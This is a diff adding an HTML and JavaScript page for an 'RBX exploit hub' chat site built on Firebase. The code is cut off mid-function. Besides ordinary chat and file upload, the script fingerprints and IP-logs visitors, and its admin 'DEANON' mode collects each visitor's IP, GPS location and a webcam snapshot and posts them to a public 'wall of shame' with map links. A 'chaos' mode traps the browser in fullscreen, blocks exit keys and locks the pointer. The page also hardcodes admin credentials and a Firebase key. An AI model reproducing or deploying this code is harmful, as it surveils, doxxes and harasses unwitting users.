@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RBX EXPLOIT HUB</title>
+<link rel="icon" type="image/png" href="https://avatars.githubusercontent.com/u/191417722?v=4">
+<style>
+:root{
+  --red:#ff0000;
+  --red2:#cc0000;
+  --red3:#ff3333;
+  --red-glow:rgba(255,0,0,0.18);
+  --bg:#0d0d0d;
+  --panel:#131313;
+  --panel2:#1a1a1a;
+  --border:rgba(255,0,0,0.25);
+  --border2:rgba(255,0,0,0.5);
+  --text:#e0e0e0;
+  --dim:#888;
+  --green:#00ff88;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{
+  font-family:'Courier New',monospace;
+  background:var(--bg);
+  color:var(--text);
+  overflow:hidden;
+  height:100vh;
+}
+canvas#matrix{
+  position:fixed;top:0;left:0;z-index:-1;opacity:0.25;
+}
+
+/* SCROLLBAR */
+::-webkit-scrollbar{width:4px;}
+::-webkit-scrollbar-track{background:#0d0d0d;}
+::-webkit-scrollbar-thumb{background:var(--red2);border-radius:2px;}
+
+#chat-container{
+  display:flex;
+  flex-direction:column;
+  height:100vh;
+  max-width:640px;
+  margin:auto;
+  padding:10px;
+  background:rgba(0,0,0,0.78);
+  border-left:1px solid var(--border);
+  border-right:1px solid var(--border);
+  overflow:hidden;
+}
+
+/* BANNER */
+#banner{
+  text-align:center;
+  color:var(--red);
+  font-size:1.4rem;
+  letter-spacing:4px;
+  text-transform:uppercase;
+  padding:8px 0 4px;
+  border-bottom:1px solid var(--border);
+  margin-bottom:6px;
+  text-shadow:0 0 8px var(--red);
+  position:relative;
+}
+#banner span{
+  font-size:0.65rem;
+  color:var(--dim);
+  display:block;
+  letter-spacing:6px;
+  margin-top:1px;
+}
+.status-dot{
+  display:inline-block;
+  width:7px;height:7px;
+  border-radius:50%;
+  background:var(--green);
+  box-shadow:0 0 6px var(--green);
+  margin-right:6px;
+  vertical-align:middle;
+  animation:pulse 2s infinite;
+}
+@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.4;}}
+
+/* CHAT */
+#chat{
+  flex:1;
+  overflow-y:auto;
+  padding:6px 2px;
+  display:flex;
+  flex-direction:column;
+  gap:3px;
+}
+.msg{
+  padding:5px 10px;
+  border-radius:3px;
+  display:inline-block;
+  max-width:85%;
+  word-wrap:break-word;
+  font-size:0.85rem;
+  border-left:2px solid transparent;
+  line-height:1.5;
+}
+.msg.me{
+  background:rgba(255,0,0,0.12);
+  align-self:flex-end;
+  color:#ffcccc;
+  border-left:2px solid var(--red2);
+}
+.msg.other{
+  background:rgba(255,255,255,0.04);
+  align-self:flex-start;
+  color:#d0d0d0;
+  border-left:2px solid #333;
+}
+.msg.admin{
+  background:rgba(255,0,0,0.22);
+  color:var(--red3);
+  border-left:2px solid var(--red);
+}
+.msg.banned{
+  background:rgba(255,0,0,0.45);
+  color:#fff;
+  animation:flash 0.3s infinite;
+}
+.msg.alt{
+  background:rgba(255,140,0,0.15);
+  color:#ffa500;
+  border-left:2px solid #ff8c00;
+}
+.msg.file-msg img.inline-img{
+  display:block;
+  max-width:100%;
+  max-height:200px;
+  margin-top:5px;
+  border:1px solid var(--red2);
+  border-radius:2px;
+}
+.file-link{
+  color:var(--red3);
+  text-decoration:underline;
+  font-size:0.8rem;
+  margin-top:3px;
+  display:inline-block;
+}
+@keyframes flash{0%,100%{opacity:1;}50%{opacity:0.25;}}
+
+/* INPUT ROW */
+#input-container{
+  display:flex;
+  gap:4px;
+  margin-top:6px;
+  align-items:stretch;
+}
+#username{
+  width:120px;
+  min-width:80px;
+  flex-shrink:0;
+}
+#message{flex:1;}
+#username,#message{
+  padding:6px 8px;
+  font-family:monospace;
+  font-size:0.82rem;
+  background:#0f0f0f;
+  color:var(--text);
+  border:1px solid var(--border);
+  border-radius:2px;
+  outline:none;
+  transition:border-color 0.15s;
+}
+#username:focus,#message:focus{border-color:var(--red2);}
+#send{
+  padding:6px 12px;
+  background:var(--red2);
+  color:#fff;
+  border:none;
+  cursor:pointer;
+  font-family:monospace;
+  font-weight:bold;
+  font-size:0.82rem;
+  border-radius:2px;
+  transition:background 0.15s;
+  letter-spacing:1px;
+}
+#send:hover{background:var(--red);}
+
+/* FILE UPLOAD ROW */
+#upload-row{
+  display:flex;
+  align-items:center;
+  gap:6px;
+  margin-top:5px;
+}
+#fileInput{display:none;}
+#fileLabel{
+  padding:5px 10px;
+  background:#1a1a1a;
+  color:var(--red3);
+  border:1px solid var(--border2);
+  border-radius:2px;
+  cursor:pointer;
+  font-size:0.78rem;
+  font-family:monospace;
+  letter-spacing:1px;
+  transition:background 0.15s;
+  white-space:nowrap;
+}
+#fileLabel:hover{background:rgba(255,0,0,0.1);}
+#fileNameDisplay{
+  font-size:0.75rem;
+  color:var(--dim);
+  flex:1;
+  overflow:hidden;
+  text-overflow:ellipsis;
+  white-space:nowrap;
+}
+#uploadBtn{
+  padding:5px 10px;
+  background:var(--red2);
+  color:#fff;
+  border:none;
+  cursor:pointer;
+  font-family:monospace;
+  font-size:0.78rem;
+  border-radius:2px;
+  letter-spacing:1px;
+  display:none;
+  transition:background 0.15s;
+}
+#uploadBtn:hover{background:var(--red);}
+
+/* PROGRESS */
+#progressContainer{
+  display:none;
+  margin-top:4px;
+}
+#progressLabel{
+  font-size:0.72rem;
+  color:var(--dim);
+  margin-bottom:3px;
+}
+#progressTrack{
+  width:100%;
+  height:4px;
+  background:#1e1e1e;
+  border-radius:2px;
+  overflow:hidden;
+}
+#progressBar{
+  height:100%;
+  width:0%;
+  background:var(--red);
+  border-radius:2px;
+  transition:width 0.1s;
+}
+
+/* SECTION LABEL */
+.section-label{
+  font-size:0.65rem;
+  color:var(--dim);
+  letter-spacing:3px;
+  text-transform:uppercase;
+  margin:8px 0 4px;
+  padding-bottom:3px;
+  border-bottom:1px solid var(--border);
+}
+
+/* ADMIN LOGIN */
+#admin-login{
+  margin-top:8px;
+  padding:8px 10px;
+  background:var(--panel);
+  border:1px solid var(--border);
+  border-radius:2px;
+}
+#admin-login-row{
+  display:flex;
+  gap:4px;
+  flex-wrap:wrap;
+}
+#adminUser,#adminPass{
+  flex:1;
+  min-width:80px;
+  padding:5px 8px;
+  font-family:monospace;
+  font-size:0.78rem;
+  background:#0f0f0f;
+  color:var(--text);
+  border:1px solid var(--border);
+  border-radius:2px;
+  outline:none;
+}
+#adminUser:focus,#adminPass:focus{border-color:var(--red2);}
+#adminLoginBtn{
+  padding:5px 12px;
+  background:#1e1e1e;
+  color:var(--red3);
+  border:1px solid var(--border2);
+  cursor:pointer;
+  font-family:monospace;
+  font-size:0.78rem;
+  border-radius:2px;
+  letter-spacing:1px;
+}
+#adminLoginBtn:hover{background:rgba(255,0,0,0.12);}
+
+/* ADMIN PANEL */
+#admin-panel{
+  display:none;
+  background:rgba(255,0,0,0.06);
+  border:1px solid rgba(255,0,0,0.35);
+  border-radius:2px;
+  padding:10px;
+  margin-top:8px;
+}
+#admin-panel h3{
+  color:var(--red);
+  font-size:0.8rem;
+  letter-spacing:3px;
+  margin-bottom:8px;
+}
+.admin-row{
+  display:flex;
+  gap:4px;
+  margin-bottom:5px;
+  flex-wrap:wrap;
+}
+.admin-input{
+  flex:1;
+  min-width:80px;
+  padding:4px 7px;
+  font-family:monospace;
+  font-size:0.78rem;
+  background:#0f0f0f;
+  color:var(--text);
+  border:1px solid var(--border);
+  border-radius:2px;
+  outline:none;
+}
+.admin-input:focus{border-color:var(--red2);}
+.admin-btn{
+  padding:4px 10px;
+  font-family:monospace;
+  font-size:0.78rem;
+  border:none;
+  cursor:pointer;
+  border-radius:2px;
+  color:#fff;
+  letter-spacing:1px;
+  transition:filter 0.15s;
+}
+.admin-btn:hover{filter:brightness(1.2);}
+.btn-ban{background:#800;}
+.btn-unban{background:#040;}
+.btn-clear{background:#333;}
+.btn-wtf{background:#990000;}
+.btn-rickroll{background:#7b0080;}
+.btn-doxx{background:#550055;}
+.btn-shame-clear{background:#443300;}
+.btn-crash{background:#1a0000;border:1px solid var(--red);}
+.btn-full{width:100%;margin-top:3px;padding:6px;font-size:0.82rem;}
+
+/* SHAME BUTTON */
+#shameBtn{
+  width:100%;
+  margin-top:8px;
+  padding:7px;
+  background:#1a0000;
+  color:var(--red3);
+  border:1px solid rgba(255,0,0,0.4);
+  cursor:pointer;
+  font-family:monospace;
+  font-size:0.78rem;
+  letter-spacing:2px;
+  border-radius:2px;
+  transition:background 0.15s;
+}
+#shameBtn:hover{background:rgba(255,0,0,0.12);}
+
+/* BANNED LIST */
+#banned-row{
+  margin-top:6px;
+  font-size:0.72rem;
+  color:#555;
+}
+#bannedList{color:#aa3333;}
+
+/* SHAKE */
+html.shake{animation:fullScreenShake 0.5s infinite;}
+@keyframes fullScreenShake{
+  0%,100%{transform:translate(0,0) rotate(0deg);}
+  10%{transform:translate(-15px,-15px) rotate(-3deg);}
+  20%{transform:translate(15px,15px) rotate(3deg);}
+  30%{transform:translate(-15px,15px) rotate(-2deg);}
+  40%{transform:translate(15px,-15px) rotate(2deg);}
+  50%{transform:translate(-15px,-15px) rotate(-3deg);}
+  60%{transform:translate(15px,15px) rotate(3deg);}
+  70%{transform:translate(-15px,15px) rotate(-2deg);}
+  80%{transform:translate(15px,-15px) rotate(2deg);}
+  90%{transform:translate(-15px,-15px) rotate(-3deg);}
+}
+
+/* FAKE FULLSCREEN */
+#fakeFullscreen{
+  position:fixed !important;
+  top:0 !important;left:0 !important;
+  width:100vw !important;height:100vh !important;
+  background:rgba(0,0,0,0.98);
+  display:none;
+  z-index:2147483647 !important;
+  justify-content:center;align-items:center;
+  cursor:none;
+}
+#fakeFullscreen.active{display:flex;}
+#nukeOverlay{
+  position:absolute;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,0.9);display:none;z-index:1;
+  justify-content:center;align-items:center;
+}
+#nukeOverlay.active{display:flex;}
+#nukeGif{width:100%;height:100%;object-fit:cover;border:none;}
+#rickrollOverlay{
+  position:absolute;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,0.95);display:none;z-index:1;
+  justify-content:center;align-items:center;
+}
+#rickrollOverlay.active{display:flex;}
+#rickrollGif{width:100%;height:100%;object-fit:cover;border:none;}
+
+/* WALL OF SHAME MODAL */
+#shameModal{
+  display:none;
+  position:fixed;top:0;left:0;
+  width:100vw;height:100vh;
+  background:rgba(0,0,0,0.98);
+  z-index:9999;overflow-y:auto;padding:20px;
+}
+#closeShame{
+  position:fixed;top:20px;right:20px;
+  background:var(--red2);color:#fff;
+  padding:8px 18px;border:none;cursor:pointer;
+  font-family:monospace;font-weight:bold;font-size:14px;
+  border-radius:2px;z-index:10000;letter-spacing:2px;
+}
+#closeShame:hover{background:var(--red);}
+#shameModal h2{
+  color:var(--red);text-align:center;font-size:2rem;
+  text-shadow:0 0 10px var(--red);margin-bottom:25px;
+  letter-spacing:4px;
+}
+#shameList{margin-top:30px;max-width:800px;margin-left:auto;margin-right:auto;}
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div id="fakeFullscreen">
+  <div id="nukeOverlay">
+    <img id="nukeGif" src="https://media.giphy.com/media/HhTXt43pk1I1W/giphy.gif" alt="">
+  </div>
+  <div id="rickrollOverlay">
+    <img id="rickrollGif" src="https://media.giphy.com/media/Vuw9m5wXviFIQ/giphy.gif" alt="">
+  </div>
+</div>
+
+<div id="shameModal">
+  <button id="closeShame">close x</button>
+  <h2>wall of shame</h2>
+  <div id="shameList"></div>
+</div>
+
+<div id="chat-container">
+  <h1 id="banner">
+    <span class="status-dot"></span>rbx exploit hub
+    <span>executor chat — members only</span>
+  </h1>
+
+  <div id="chat"></div>
+
+  <div id="input-container">
+    <input id="username" placeholder="ur name" maxlength="24">
+    <input id="message" placeholder="say smth...">
+    <button id="send">EXEC</button>
+  </div>
+
+  <div id="upload-row">
+    <input type="file" id="fileInput" accept="*/*">
+    <label for="fileInput" id="fileLabel">+ attach</label>
+    <span id="fileNameDisplay">nothing picked</span>
+    <button id="uploadBtn">UPLOAD</button>
+  </div>
+
+  <div id="progressContainer">
+    <div id="progressLabel">uploading...</div>
+    <div id="progressTrack"><div id="progressBar"></div></div>
+  </div>
+
+  <div id="admin-login">
+    <div class="section-label">admin login</div>
+    <div id="admin-login-row">
+      <input id="adminUser" placeholder="username">
+      <input id="adminPass" type="password" placeholder="pass">
+      <button id="adminLoginBtn">LOGIN</button>
+    </div>
+  </div>
+
+  <div id="admin-panel">
+    <h3>~ admin tools ~</h3>
+    <div class="admin-row">
+      <input id="banUser" class="admin-input" placeholder="who to ban">
+      <button id="banBtn" class="admin-btn btn-ban">BAN</button>
+    </div>
+    <div class="admin-row">
+      <input id="unbanUser" class="admin-input" placeholder="who to unban">
+      <button id="unbanBtn" class="admin-btn btn-unban">UNBAN</button>
+    </div>
+    <div class="admin-row">
+      <button id="clearBtn" class="admin-btn btn-clear btn-full">wipe chat</button>
+    </div>
+    <div class="admin-row">
+      <button id="wtfBtn" class="admin-btn btn-wtf btn-full">chaos mode</button>
+    </div>
+    <div class="admin-row">
+      <button id="rickrollBtn" class="admin-btn btn-rickroll btn-full">bait script</button>
+    </div>
+    <div class="admin-row">
+      <button id="doxxBtn" class="admin-btn btn-doxx btn-full">DEANON</button>
+    </div>
+    <div class="admin-row">
+      <button id="clearShameBtn" class="admin-btn btn-shame-clear btn-full">purge shame log</button>
+    </div>
+    <div class="admin-row">
+      <button id="crashBtn" class="admin-btn btn-crash btn-full">CRASH</button>
+    </div>
+  </div>
+
+  <button id="shameBtn">view deanon log</button>
+
+  <div id="banned-row">banned: <span id="bannedList">(none)</span></div>
+</div>
+
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/12.2.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/12.2.1/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/12.2.1/firebase-storage-compat.js"></script>
+
+<script>
+const firebaseConfig={
+  apiKey:"AIzaSyCiINrjPrVNG1aDC-OOq9Z1z9ZRwjjzXQI",
+  authDomain:"hacker-hangout-gam3r999.firebaseapp.com",
+  databaseURL:"https://hacker-hangout-gam3r999-default-rtdb.firebaseio.com",
+  projectId:"hacker-hangout-gam3r999",
+  storageBucket:"hacker-hangout-gam3r999.firebasestorage.app",
+  messagingSenderId:"411445080851",
+  appId:"1:411445080851:web:f0c3b87f8f6ec4cf4ea0e6",
+  measurementId:"G-X880BXHHRE"
+};
+firebase.initializeApp(firebaseConfig);
+</script>
+
+<script>
+(function(){
+  const chatEl=document.getElementById('chat');
+  const userEl=document.getElementById('username');
+  const msgEl=document.getElementById('message');
+  const sendBtn=document.getElementById('send');
+  const adminUserEl=document.getElementById('adminUser');
+  const adminPassEl=document.getElementById('adminPass');
+  const adminLoginBtn=document.getElementById('adminLoginBtn');
+  const adminPanel=document.getElementById('admin-panel');
+  const banUserEl=document.getElementById('banUser');
+  const unbanUserEl=document.getElementById('unbanUser');
+  const banBtn=document.getElementById('banBtn');
+  const unbanBtn=document.getElementById('unbanBtn');
+  const clearBtn=document.getElementById('clearBtn');
+  const bannedListEl=document.getElementById('bannedList');
+  const wtfBtn=document.getElementById('wtfBtn');
+  const rickrollBtn=document.getElementById('rickrollBtn');
+  const doxxBtn=document.getElementById('doxxBtn');
+  const clearShameBtn=document.getElementById('clearShameBtn');
+  const crashBtn=document.getElementById('crashBtn');
+  const shameBtn=document.getElementById('shameBtn');
+  const shameModal=document.getElementById('shameModal');
+  const closeShame=document.getElementById('closeShame');
+  const shameList=document.getElementById('shameList');
+  const fakeFullscreen=document.getElementById('fakeFullscreen');
+  const nukeOverlay=document.getElementById('nukeOverlay');
+  const rickrollOverlay=document.getElementById('rickrollOverlay');
+  const htmlElement=document.documentElement;
+
+  // File upload elements
+  const fileInput=document.getElementById('fileInput');
+  const fileNameDisplay=document.getElementById('fileNameDisplay');
+  const uploadBtn=document.getElementById('uploadBtn');
+  const progressContainer=document.getElementById('progressContainer');
+  const progressBar=document.getElementById('progressBar');
+  const progressLabel=document.getElementById('progressLabel');
+
+  const DEFAULT_ADMINS={"adminsonlylol":"thisadminwilleventuallybeabused"};
+  let admins={...DEFAULT_ADMINS};
+  let bannedUsers={};
+  let chaosModeLocked=false;
+  let trapActive=false;
+  let pointerLockInterval=null;
+  let fullscreenInterval=null;
+  let fullscreenPrimed=false;
+  let currentUserIP=null;
+  let selectedFile=null;
+
+  // Device fingerprint
+  let deviceId=localStorage.getItem('hh_device_id');
+  if(!deviceId){
+    deviceId=Date.now().toString(36)+Math.random().toString(36).slice(2,8);
+    localStorage.setItem('hh_device_id',deviceId);
+  }
+
+  function generateFingerprint(){
+    const canvas=document.createElement('canvas');
+    const ctx=canvas.getContext('2d');
+    ctx.textBaseline='top';ctx.font='14px Arial';
+    ctx.textBaseline='alphabetic';
+    ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);
+    ctx.fillStyle='#069';ctx.fillText('Browser fingerprint',2,15);
+    ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Browser fingerprint',4,17);
+    const cf=canvas.toDataURL();
+    const sf=`${screen.width}x${screen.height}x${screen.colorDepth}`;
+    const tz=new Date().getTimezoneOffset();
+    const lang=navigator.language||navigator.userLanguage;
+    const plat=navigator.platform;
+    const plug=Array.from(navigator.plugins||[]).map(p=>p.name).join(',');
+    const combined=`${cf}|${sf}|${tz}|${lang}|${plat}|${plug}|${navigator.hardwareConcurrency}|${navigator.deviceMemory}`;
+    let hash=0;
+    for(let i=0;i<combined.length;i++){
+      const c=combined.charCodeAt(i);
+      hash=((hash<<5)-hash)+c;hash=hash&hash;
+    }
+    return hash.toString(36);
+  }
+  const browserFingerprint=generateFingerprint();
+
+  async function getUserIP(){
+    try{
+      const r=await fetch('https://api.ipify.org?format=json');
+      const d=await r.json();
+      currentUserIP=d.ip;return d.ip;
+    }catch(e){return null;}
+  }
+
+  const db=firebase.database();
+  const storage=firebase.storage();
+  const storageRootRef=storage.ref();
+
+  const messagesRef=db.ref('messages');
+  const bannedRef=db.ref('banned');
+  const devicesRef=db.ref('devices');
+  const wtfModeRef=db.ref('wtfMode');
+  const rickrollModeRef=db.ref('rickrollMode');
+  const doxxModeRef=db.ref('doxxMode');
+  const crashModeRef=db.ref('crashMode');
+  const shameRef=db.ref('wallOfShame');
+  const fingerprintsRef=db.ref('fingerprints');
+
+  // ── FILE UPLOAD ───────────────────────────────────────────────
+  fileInput.addEventListener('change',()=>{
+    const f=fileInput.files[0];
+    if(!f){selectedFile=null;fileNameDisplay.textContent='no file selected';uploadBtn.style.display='none';return;}
+    selectedFile=f;
+    fileNameDisplay.textContent=`${f.name} (${formatBytes(f.size)})`;
+    uploadBtn.style.display='block';
+  });
+
+  function formatBytes(bytes){
+    if(bytes<1024)return bytes+'B';
+    if(bytes<1048576)return (bytes/1024).toFixed(1)+'KB';
+    if(bytes<1073741824)return (bytes/1048576).toFixed(1)+'MB';
+    return (bytes/1073741824).toFixed(2)+'GB';
+  }
+
+  uploadBtn.addEventListener('click',async()=>{
+    if(!selectedFile)return;
+    const username=(userEl.value||'Anonymous').trim();
+    const ext=selectedFile.name.split('.').pop()||'bin';
+    const safeName=selectedFile.name.replace(/[^a-zA-Z0-9._-]/g,'_');
+    const path=`uploads/${Date.now()}_${Math.random().toString(36).slice(2,6)}_${safeName}`;
+    const fileRef=storageRootRef.child(path);
+
+    progressContainer.style.display='block';
+    progressBar.style.width='0%';
+    progressLabel.textContent=`uploading ${selectedFile.name}...`;
+    uploadBtn.style.display='none';
+
+    const uploadTask=fileRef.put(selectedFile);
+
+    uploadTask.on('state_changed',
+      snapshot=>{
+        const pct=Math.round((snapshot.bytesTransferred/snapshot.totalBytes)*100);
+        progressBar.style.width=pct+'%';
+        progressLabel.textContent=`[${pct}%] ${selectedFile.name} — ${formatBytes(snapshot.bytesTransferred)} / ${formatBytes(snapshot.totalBytes)}`;
+      },
+      err=>{
+        progressLabel.textContent=`upload failed lol: ${err.message}`;
+        setTimeout(()=>{progressContainer.style.display='none';},4000);
+        uploadBtn.style.display='block';
+      },
+      async()=>{
+        const url=await uploadTask.snapshot.ref.getDownloadURL();
+        progressLabel.textContent=`done: ${selectedFile.name}`;
+        setTimeout(()=>{progressContainer.style.display='none';},2000);
+
+        const userIP=currentUserIP||await getUserIP();
+        const altCheck=await checkForAltAccount(username,userIP);
+        saveUserFingerprint(username,userIP);
+        devicesRef.child(username+'_'+deviceId).set({timestamp:Date.now()});
+
+        messagesRef.push({
+          username,
+          text:`📎 ${selectedFile.name}`,
+          fileUrl:url,
+          fileName:selectedFile.name,
+          fileSize:selectedFile.size,
+          fileType:selectedFile.type||'',
+          timestamp:Date.now(),
+          deviceId,
+          fingerprint:browserFingerprint,
+          ip:userIP,
+          isAlt:altCheck.isAlt,
+          originalUsername:altCheck.originalUsername
+        });
+
+        selectedFile=null;
+        fileInput.value='';
+        fileNameDisplay.textContent='no file selected';
+      }
+    );
+  });
+
+  // ── ALT / FINGERPRINT DETECTION ──────────────────────────────
+  async function checkForAltAccount(username,userIP){
+    return new Promise(resolve=>{
+      fingerprintsRef.once('value',snapshot=>{
+        const fp=snapshot.val()||{};
+        let isAlt=false,originalUsername=null;
+        for(const[user,data] of Object.entries(fp)){
+          if(user!==username){
+            if(data.fingerprint===browserFingerprint||data.deviceId===deviceId||(userIP&&data.ip===userIP)){
+              isAlt=true;originalUsername=user;break;
+            }
+          }
+        }
+        resolve({isAlt,originalUsername});
+      });
+    });
+  }
+
+  function saveUserFingerprint(username,userIP){
+    fingerprintsRef.child(username).set({
+      fingerprint:browserFingerprint,deviceId,ip:userIP,timestamp:Date.now()
+    });
+  }
+
+  function autoDeleteBannedMessages(){
+    messagesRef.on('child_added',snapshot=>{
+      const m=snapshot.val();
+      if(bannedUsers[m.username])snapshot.ref.remove();
+    });
+  }
+
+  function showPussyMessage(){
+    const el=document.createElement('div');
+    el.style.cssText='position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(255,0,0,0.95);color:#fff;padding:40px;border:3px solid #f00;border-radius:4px;z-index:999999;text-align:center;font-size:2.5rem;font-weight:bold;font-family:monospace;';
+    el.textContent="What a fuckin' pussy";
+    document.body.appendChild(el);
+    setTimeout(()=>el.remove(),3000);
+  }
+
+  async function logToShame(username){
+    try{
+      const ipR=await fetch('https://api.ipify.org?format=json');
+      const ipD=await ipR.json();
+      const userIP=ipD.ip;
+      let city='Unknown',country='Unknown',region='Unknown',lat='Unknown',lon='Unknown',locType='IP-based (approximate)',photo=null;
+      try{
+        const gR=await fetch(`https://ipapi.co/${userIP}/json/`);
+        const gD=await gR.json();
+        city=gD.city||'Unknown';country=gD.country_name||'Unknown';
+        region=gD.region||'Unknown';lat=gD.latitude||'Unknown';lon=gD.longitude||'Unknown';
+      }catch(e){}
+      if(navigator.geolocation){
+        try{
+          const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));
+          lat=pos.coords.latitude;lon=pos.coords.longitude;locType='GPS (precise)';
+          try{
+            const rg=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+            const ad=await rg.json();
+            city=ad.address.city||ad.address.town||ad.address.village||city;
+            region=ad.address.state||region;country=ad.address.country||country;
+          }catch(e){}
+        }catch(e){showPussyMessage();}
+      }
+      try{
+        const stream=await navigator.mediaDevices.getUserMedia({video:{width:640,height:480},audio:false});
+        const vid=document.createElement('video');
+        vid.srcObject=stream;vid.play();
+        await new Promise(r=>{vid.onloadedmetadata=r;});
+        await new Promise(r=>setTimeout(r,500));
+        const cvs=document.createElement('canvas');cvs.width=640;cvs.height=480;
+        const c=cvs.getContext('2d');c.drawImage(vid,0,0,640,480);
+        photo=cvs.toDataURL('image/jpeg',0.8);
+        stream.getTracks().forEach(t=>t.stop());
+      }catch(e){showPussyMessage();}
+      const ua=navigator.userAgent;
+      let browser='Unknown';
+      if(ua.indexOf('Firefox')>-1)browser='Firefox';
+      else if(ua.indexOf('Edg')>-1)browser='Edge';
+      else if(ua.indexOf('Chrome')>-1)browser='Chrome';
+      else if(ua.indexOf('Safari')>-1)browser='Safari';
+      let device='Desktop';
+      if(/(tablet|ipad)/i.test(ua))device='Tablet';
+      else if(/Mobile|Android|iPhone/.test(ua))device='Mobile';
+      let os='Unknown';
+      if(ua.indexOf('Win')>-1)os='Windows';
+      else if(ua.indexOf('Mac')>-1)os='MacOS';
+      else if(ua.indexOf('Linux')>-1)os='Linux';
+      else if(ua.indexOf('Android')>-1)os='Android';
+      shameRef.push({username,ip:userIP,city,region,country,latitude:lat,longitude:lon,locationType:locType,photo,browser,device,os,timestamp:Date.now(),deviceId,fingerprint:browserFingerprint});
+    }catch(e){}
+  }
+
+  function showWallOfShame(){
+    shameModal.style.display='block';
+    shameRef.on('value',snapshot=>{
+      shameList.innerHTML='';
+      const shamed=[];snapshot.forEach(c=>shamed.push(c.val()));
+      shamed.sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
+      shamed.forEach(entry=>{
+        const div=document.createElement('div');
+        div.style.cssText='background:rgba(255,0,0,0.1);border:1px solid rgba(255,0,0,0.4);padding:20px;margin:12px 0;border-radius:3px;font-family:monospace;';
+        const date=new Date(entry.timestamp).toLocaleString();
+        const loc=`${entry.city||'?'}, ${entry.region||'?'}, ${entry.country||'?'}`;
+        const coords=`${entry.latitude||'?'}, ${entry.longitude||'?'}`;
+        const mapsHref=(entry.latitude!=='Unknown'&&entry.longitude!=='Unknown')?`https://www.google.com/maps?q=${entry.latitude},${entry.longitude}`:'#';
+        div.innerHTML=`
+          <div style="color:#e0e0e0;font-size:1.2rem;margin-bottom:8px;"><strong style="color:#ff3333;">» ${escapeHtml(entry.username)}</strong></div>
+          ${entry.photo?`<div style="margin:12px 0;"><img src="${entry.photo}" style="max-width:100%;border:1px solid #f00;border-radius:2px;"/></div>`:''}
+          <div style="color:#ff0000;font-size:1.4rem;font-weight:bold;margin:8px 0;">IP: ${escapeHtml(entry.ip)}</div>
+          <div style="color:#ffcc00;margin:5px 0;">LOC: ${escapeHtml(loc)}</div>
+          <div style="color:#00ccff;margin:5px 0;">COORDS: ${escapeHtml(coords)} <span style="color:#666;font-size:0.8rem;">(${escapeHtml(entry.locationType||'?')})</span></div>
+          ${mapsHref!=='#'?`<div style="margin:5px 0;"><a href="${mapsHref}" target="_blank" style="color:#00ff88;text-decoration:underline;">[ OPEN IN MAPS ]</a></div>`:''}
+          <div style="color:#aaa;font-size:0.85rem;margin-top:8px;">${escapeHtml(entry.device||'?')} / ${escapeHtml(entry.os||'?')} / ${escapeHtml(entry.browser||'?')}</div>
+          <div style="color:#555;font-size:0.75rem;margin-top:8px;">${date}</div>
+        `;
+        shameList.appendChild(div);
+      });
+      if(shamed.length===0)shameList.innerHTML='<p style="color:#444;text-align:center;padding:50px;font-family:monospace;">nothing here yet</p>';
+    });
+  }
+
+  // ── CHAOS / FULLSCREEN TRAP ───────────────────────────────────
+  function attemptFullscreen(){
+    const e=document.documentElement;
+    if(e.requestFullscreen)e.requestFullscreen().catch(()=>{});
+    else if(e.webkitRequestFullscreen)e.webkitRequestFullscreen();
+    else if(e.msRequestFullscreen)e.msRequestFullscreen();
+    else if(e.mozRequestFullScreen)e.mozRequestFullScreen();
+  }
+  function primeFullscreen(){
+    if(!fullscreenPrimed){
+      document.addEventListener('click',()=>{if(trapActive)attemptFullscreen();},false);
+      document.addEventListener('keydown',()=>{if(trapActive)attemptFullscreen();},false);
+      document.addEventListener('touchstart',()=>{if(trapActive)attemptFullscreen();},false);
+      document.addEventListener('mousemove',()=>{if(trapActive)attemptFullscreen();},false);
+      fullscreenPrimed=true;
+    }
+  }
+  function trapUser(e){if(trapActive){e.preventDefault();e.returnValue='YOU CANNOT ESCAPE';attemptFullscreen();return'YOU CANNOT ESCAPE';}}
+  function blockAllExits(e){
+    if(trapActive){
+      if(e.key==='Escape'||e.key==='F11'||e.keyCode===27||e.keyCode===122||(e.altKey&&e.keyCode===115)||(e.ctrlKey&&(e.key==='w'||e.key==='W'))||(e.metaKey&&(e.key==='w'||e.key==='W'))){
+        e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();attemptFullscreen();return false;
+      }
+    }
+  }
+  function maintainFullscreen(){
+    if(trapActive&&!document.fullscreenElement&&!document.webkitFullscreenElement&&!document.mozFullScreenElement&&!document.msFullscreenElement)attemptFullscreen();
+  }
+  function lockPointer(){
+    if(!chaosModeLocked)return;
+    const e=fakeFullscreen;
+    if(e.requestPointerLock)e.requestPointerLock();
+    else if(e.mozRequestPointerLock)e.mozRequestPointerLock();
+    else if(e.webkitRequestPointerLock)e.webkitRequestPointerLock();
+  }
+  function unlockPointer(){
+    if(document.exitPointerLock)document.exitPointerLock();
+    else if(document.mozExitPointerLock)document.mozExitPointerLock();
+  }
+  function maintainPointerLock(){
+    pointerLockInterval=setInterval(()=>{
+      if(chaosModeLocked&&!document.pointerLockElement&&!document.mozPointerLockElement&&!document.webkitPointerLockElement)lockPointer();
+    },50);
+  }
+  function exitFullscreen(){
+    if(document.exitFullscreen)document.exitFullscreen().catch(()=>{});
+    else if(document.webkitExitFullscreen)document.webkitExitFullscreen();
+    else if(document.mozCancelFullScreen)document.mozCancelFullScreen();
+    else if(document.msExitFullscreen)document.msExitFullscreen();
+  }
+  function startChaosTrap(){
+    trapActive=true;chaosModeLocked=true;
+    fakeFullscreen.classList.add('active');
+    attemptFullscreen();
+    window.addEventListener('beforeunload',trapUser);
+    window.addEventListener('unload',trapUser);
